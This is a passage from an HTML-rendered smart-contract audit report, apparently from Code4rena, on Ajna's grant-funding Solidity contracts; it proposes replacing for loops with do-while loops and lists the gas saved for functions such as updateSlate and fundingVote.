class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"192\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/Funding.sol b/src/grants/base/Funding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 72fafb9..37bd3fb 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/Funding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/Funding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -59,10 +59,12 @@ abstract contract Funding is IFunding, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit ProposalExecuted(proposalId_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         string memory errorMessage = &quot;Governor: call reverted without message&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 i = 0; i &lt; targets_.length; ++i) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        do {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             (bool success, bytes memory returndata) = targets_[i].call{value: values_[i]}(calldatas_[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             Address.verifyCallResult(success, returndata, errorMessage);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            ++i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } while(i &lt; targets_.length);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      /**</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L112-L140\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L112-L140</a></p>\n<p><em>Gas Savings for <code>GrantFund.proposeExtraordinary</code>, obtained via protocol’s tests: Avg 44 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>86505</td>\n</tr>\n<tr>\n<td>After</td>\n<td>86461</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"193\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Funding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">112</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// check targets and values params are valid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] != </span><span class=\"mtk12\">ajnaTokenAddress</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">116</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">117</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// check calldata function selector is transfer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">selDataWithSig</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">calldatas_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// update tokens requested for additional calldata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">137</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">tokensRequested_</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">SafeCast</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toUint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokensRequested</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"194\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/Funding.sol b/src/grants/base/Funding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 72fafb9..e9b3097 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/Funding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/Funding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -108,9 +108,9 @@ abstract contract Funding is IFunding, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check params have matching lengths</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (targets_.length == 0 || targets_.length != values_.length || targets_.length != calldatas_.length) revert InvalidProposal();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 i = 0; i &lt; targets_.length;) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        do {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // check targets and values params are valid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (targets_[i] != ajnaTokenAddress || values_[i] != 0) revert InvalidProposal();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -137,7 +137,7 @@ abstract contract Funding is IFunding, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             tokensRequested_ += SafeCast.toUint128(tokensRequested);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             unchecked { ++i; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } while(i &lt; targets_.length);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /**</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L434-L454\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L434-L454</a></p>\n<p><em>Gas Savings for <code>GrantFund.updateSlate</code>, obtained via protocol’s tests: Avg 167 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>318329</td>\n</tr>\n<tr>\n<td>After</td>\n<td>318162</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"195\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">434</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numProposalsInSlate_</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">435</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_standardFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalIds_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">436</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">437</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// check if Proposal is in the topTenProposals list</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">438</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_findProposalIndex</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalIds_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">_topTenProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">]) == -</span><span class=\"mtk7\">1</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidProposalSlate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">439</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">440</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// account for fundingVotesReceived possibly being negative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">441</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fundingVotesReceived</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidProposalSlate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">442</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">443</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// update counters</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">444</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">sum_</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fundingVotesReceived</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// since we are converting from int128 to uint128, we can safely assume that the value will not overflow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">445</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">totalTokensRequested</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokensRequested</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">446</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">447</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// check if slate of proposals exceeded budget constraint ( 90% of GBC )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">448</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalTokensRequested</span><span class=\"mtk1\"> &gt; (</span><span class=\"mtk12\">gbc</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">9</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">10</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">449</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidProposalSlate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">450</span><span class=\"mtk1\">:            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">451</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">452</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">453</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">454</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"196\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..17c47e8 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -431,7 +431,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 totalTokensRequested = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check each proposal in the slate is valid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint i = 0; i &lt; numProposalsInSlate_; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        do {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             Proposal memory proposal = _standardFundingProposals[proposalIds_[i]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // check if Proposal is in the topTenProposals list</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -450,7 +451,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             unchecked { ++i; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } while(i &lt; numProposalsInSlate_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /**</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L549-L568\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L549-L568</a></p>\n<p><em>Gas Savings for <code>GrantFund.fundingVote</code>, obtained via protocol’s tests: Avg 111 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>409345</td>\n</tr>\n<tr>\n<td>After</td>\n<td>409234</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"197\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">549</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numVotesCast</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">550</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_standardFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">voteParams_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">551</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">552</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// check that the proposal is part of the current distribution period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">553</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">currentDistributionId</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidVote</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">554</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">555</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// check that the proposal being voted on is in the top ten screened proposals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">556</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_findProposalIndex</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voteParams_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_topTenProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">currentDistributionId</span><span class=\"mtk1\">]) == -</span><span class=\"mtk7\">1</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidVote</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">557</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">558</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// cast each successive vote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">559</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">_fundingVote</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">560</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">561</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">562</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">563</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">voter</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">564</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">voteParams_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">565</span><span class=\"mtk1\">:            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">566</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">567</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">568</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"198\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..9dcab1a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -545,8 +545,9 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 numVotesCast = voteParams_.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 i = 0; i &lt; numVotesCast; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        do {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             Proposal storage proposal = _standardFundingProposals[voteParams_[i].proposalId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // check that the proposal is part of the current distribution period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -565,7 +566,7 @@ abstract contract StandardFunding is Funding, IStandardFunding 